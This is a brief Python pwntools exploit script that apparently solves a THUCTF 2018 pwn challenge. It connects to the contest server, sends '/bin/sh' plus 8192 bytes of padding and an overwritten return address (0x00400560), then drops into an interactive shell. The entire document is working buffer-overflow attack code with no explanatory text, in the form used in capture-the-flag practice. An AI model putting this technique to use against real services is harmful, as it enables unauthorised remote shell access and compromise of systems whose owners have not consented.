from pwn import *
r = remote('pwn.thuctf2018.game.redbud.info', 20002)
r.send('/bin/sh\0'+'A'*(8192-8))
r.send('A'*8)
r.send(p32(0x00400560))
r.send('\n')
r.interactive()
